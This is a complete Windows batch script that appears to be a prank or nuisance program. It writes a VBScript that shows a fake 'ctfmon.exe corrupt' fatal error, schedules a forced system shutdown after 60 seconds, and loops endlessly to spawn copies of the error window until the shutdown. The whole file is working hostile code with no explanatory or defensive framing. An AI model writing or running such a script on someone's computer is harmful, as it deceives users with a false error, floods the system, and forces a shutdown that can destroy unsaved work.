@echo off

echo x=msgbox("Fatal error: ctfmon.exe corrupt" ,48, "Windows is Shutting down due to a fatal error") >> msgbox.vbs
shutdown -s -t 60
:a
start msgbox.vbs
goto a
